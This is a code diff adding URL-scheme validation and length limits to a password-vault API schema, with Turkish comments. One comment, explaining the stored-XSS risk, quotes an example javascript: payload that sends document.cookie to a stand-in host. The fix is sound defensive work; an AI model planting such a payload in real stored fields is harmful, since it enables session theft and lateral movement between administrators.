@@ -5,13 +5,38 @@ import { encrypt, decrypt } from '../../utils/crypto.js';
 import { createAuditLog } from '../../middleware/audit.js';
 import { getStaffCompanyScope, isCompanyInScope, resolveCompanyFilter } from '../../utils/staff-scope.js';
 
+/**
+ * Kasa kaydının URL'i — yalnızca http/https.
+ *
+ * Bu değer arayüzde tıklanabilir bir `<a href>` olarak gösteriliyor ve React,
+ * `javascript:` şemasını ENGELLEMİYOR (yalnızca geliştirme uyarısı basar). Şema
+ * kısıtlanmazsa `javascript:fetch('//evil.tld?c='+document.cookie)` kaydedilip
+ * bir başka yöneticiye tıklatılabilir — eşit yetkili biri arasında yanal hareket
+ * ve kasa denetim izinin etrafından dolaşma.
+ */
+const httpUrl = z
+  .string()
+  .trim()
+  .max(2048)
+  .refine(
+    (v) => {
+      if (v === '') return true;
+      try {
+        return ['http:', 'https:'].includes(new URL(v).protocol);
+      } catch {
+        return false;
+      }
+    },
+    { message: 'URL yalnızca http:// veya https:// ile başlayabilir' },
+  );
+
 const createSchema = z.object({
-  title: z.string().min(1),
-  category: z.string().optional(),
-  url: z.string().optional(),
-  username: z.string().optional(),
-  password: z.string().min(1),
-  notes: z.string().optional(),
+  title: z.string().trim().min(1).max(200),
+  category: z.string().trim().max(100).optional(),
+  url: httpUrl.optional(),
+  username: z.string().trim().max(200).optional(),
+  password: z.string().min(1).max(1000),
+  notes: z.string().max(5000).optional(),
   companyId: z.string().cuid().optional(),
 });
 
